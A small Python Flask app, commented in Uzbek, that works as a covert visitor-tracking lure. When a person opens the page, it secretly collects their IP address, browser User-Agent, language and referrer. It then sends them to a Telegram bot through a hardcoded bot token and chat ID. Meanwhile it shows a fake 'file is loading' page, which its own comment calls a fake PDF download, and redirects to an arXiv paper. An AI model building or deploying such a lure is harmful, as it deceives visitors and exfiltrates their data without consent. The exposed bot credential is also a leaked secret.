from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# Telegram sozlamalari
API_KEY = "8512002202:AAHhI8RE3aPOOSbK7nHLiwH_cerEQpBnrBU"
CHAT_ID = "7958070473"

def send_to_telegram(data):
    msg = f"📱 YANGI QURILMA TOPILDI:\n\n" \
          f"🌐 IP: {data['ip']}\n" \
          f"📱 Qurilma: {data['user_agent']}\n" \
          f"📍 Til: {data['language']}\n" \
          f"🔗 Kelgan joyi: {data['referrer']}"
    requests.get(f"https://api.telegram.org/bot{API_KEY}/sendMessage", params={"chat_id": CHAT_ID, "text": msg})

@app.route('/')
def index():
    # Foydalanuvchi ma'lumotlarini yig'ish
    info = {
        "ip": request.remote_addr,
        "user_agent": request.headers.get('User-Agent'),
        "language": request.headers.get('Accept-Language'),
        "referrer": request.referrer
    }
    send_to_telegram(info)
    # Foydalanuvchiga soxta PDF yuklash sahifasini ko'rsatamiz
    return "<h1>Fayl yuklanmoqda...</h1><script>setTimeout(function(){ window.location.href='https://arxiv.org/pdf/2101.00001.pdf'; }, 2000);</script>"

if __name__ == "__main__":
    app.run(debug=True)
